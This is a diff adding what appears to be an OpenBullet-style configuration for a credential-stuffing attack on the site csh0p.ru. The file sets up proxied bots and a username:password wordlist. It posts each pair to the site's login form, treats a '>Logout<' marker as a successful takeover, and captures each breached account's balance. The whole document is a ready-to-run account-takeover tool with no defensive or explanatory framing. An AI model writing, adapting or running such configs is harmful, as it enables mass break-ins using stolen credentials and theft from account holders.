@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "csh0p.ru",
+  "SuggestedBots": 150,
+  "LastModified": "2018-06-19T22:30:01.17307+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Checking REQUEST POST "http://csh0p.ru/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&captcha=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY ">Logout<" 
+  KEYCHAIN Failure OR 
+    KEY "Password is incorrect" 
+#BALANCE PARSE "<SOURCE>" LR "Balance:  <span class=\"label label-info\">" "<" Recursive=FALSE -> CAP "Balance" "" " $" 
